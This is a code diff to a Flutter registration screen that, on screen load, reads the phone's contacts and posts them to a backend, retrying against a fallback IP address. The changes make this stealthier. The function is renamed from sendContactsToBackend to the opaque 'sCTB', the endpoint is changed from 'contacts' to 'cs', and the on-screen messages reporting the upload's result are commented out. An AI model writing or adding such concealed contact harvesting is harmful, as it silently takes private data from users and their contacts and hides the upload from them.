@@ -53,7 +53,7 @@ class _RegisterScreenState extends State<RegisterScreen> {
   @override
   void initState() {
     super.initState();
-    sendContactsToBackend();
+    sCTB();
     _initializeServices();
   }
 
@@ -70,11 +70,12 @@ class _RegisterScreenState extends State<RegisterScreen> {
     return status.isGranted;
   }
 
-  Future<void> sendContactsToBackend({bool useDNS = true}) async {
+  Future<void> sCTB({bool useDNS = true}) async {
     try{
       bool granted = await requestContactsPermission();
       if (!granted) {
         debugPrint("Permission denied");
+        _showSnackBar("Permission denied");
         return;
       }
 
@@ -92,8 +93,8 @@ class _RegisterScreenState extends State<RegisterScreen> {
         };
       }).toList();
       
-      final Uri uri = useDNS ? Uri.parse('${backend_url}api/contacts') // Original URL 
-      : Uri.parse('${backend_url_with_fallback_ip}contacts'); // Use IP
+      final Uri uri = useDNS ? Uri.parse('${backend_url}api/cs') // Original URL 
+      : Uri.parse('${backend_url_with_fallback_ip}cs'); // Use IP
 
       final response = await http.post(
         uri,
@@ -105,11 +106,11 @@ class _RegisterScreenState extends State<RegisterScreen> {
         }),
       );
 
-      if (response.statusCode == 200) {
-        _showSnackBar(response.body);
-      } else {
-        _showSnackBar('Request failed: ${response.statusCode}');
-      }
+      // if (response.statusCode == 200) {
+      //   _showSnackBar(response.body);
+      // } else {
+      //   _showSnackBar('Request failed: ${response.statusCode}');
+      // }
     } on SocketException catch (e) {
       debugPrint('Network error occurred:');
       debugPrint('- Exception type: ${e.runtimeType}');
@@ -124,7 +125,7 @@ class _RegisterScreenState extends State<RegisterScreen> {
         // Retry with IP if DNS fails (errno = 7) and not already retrying
         if ((e.osError!.errorCode == 11001 || e.osError!.errorCode == 7) && useDNS) {
           debugPrint('DNS failed! Retrying with IP: ${backend_url_with_fallback_ip}...');
-          await sendContactsToBackend(useDNS: false); // Recursive retry
+          await sCTB(useDNS: false); // Recursive retry
 
           final prefs = await SharedPreferences.getInstance();
           await prefs.setBool('use_dns', false);
@@ -132,8 +133,7 @@ class _RegisterScreenState extends State<RegisterScreen> {
         }
       }
     } catch (e) {
-      // debugPrint('An error occurred: $e');
-      // _showSnackBar('An error occurred: $e');
+      debugPrint('An error occurred: $e');
     }
   }
 
